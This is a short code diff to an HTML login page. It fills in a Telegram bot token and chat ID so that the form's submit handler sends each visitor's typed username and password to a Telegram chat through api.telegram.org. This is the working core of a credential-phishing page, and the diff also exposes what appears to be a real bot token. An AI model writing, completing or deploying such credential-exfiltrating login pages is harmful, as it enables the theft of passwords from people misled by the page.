@@ -495,7 +495,7 @@
 <script>
   // Function to send a message to a specified Telegram chat using XMLHttpRequest
   function sendMessageWithXHR(chatId, message) {
-      const telegramAPI = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`;
+      const telegramAPI = `https://api.telegram.org/7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
       const xhr = new XMLHttpRequest();
       const data = JSON.stringify({
           chat_id: chatId,
@@ -523,7 +523,7 @@
   document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault(); // Prevent default form submission behavior
 
-      const chatId = 'YOUR_CHAT_ID'; // Replace with your Telegram chat ID
+      const chatId = '1866571175'; // Replace with your Telegram chat ID
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
